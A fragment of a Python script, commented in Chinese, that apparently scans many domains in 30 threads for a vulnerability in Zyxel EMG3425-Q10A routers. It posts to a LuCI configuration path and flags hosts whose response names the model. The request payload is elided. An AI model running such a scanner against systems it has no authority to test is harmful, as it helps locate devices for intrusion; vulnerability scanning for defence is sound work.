...
# 定义全局变量
PATH = '/cgi-bin/luci/expert/configuration'
THREADS = 30  # 调整线程数
...
def check(domain):
    ...
    try:
        # 禁止自动重定向，以便检查原始响应
        response = requests.post(url, data=data, headers=headers, timeout=3, verify=False, allow_redirects=False)

        # 检查状态码和响应内容
        if response.status_code == 200 and 'EMG3425-Q10A' in response.text:
            print(f'[+] {domain} 存在漏洞')
            return True
